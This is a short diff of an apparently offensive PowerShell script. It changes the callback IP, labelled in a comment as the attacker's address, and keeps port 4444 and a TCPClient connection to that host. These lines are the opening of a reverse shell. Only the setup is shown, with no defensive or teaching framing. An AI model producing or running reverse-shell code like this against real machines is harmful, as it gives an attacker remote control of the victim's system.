@@ -1,4 +1,4 @@
-$ip = "10.0.0.50"      # Replace with your attacker's IP address
+$ip = "10.0.0.9"      # Replace with your attacker's IP address
 $port = 4444             # Replace with the port number you want to listen on
 
 $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
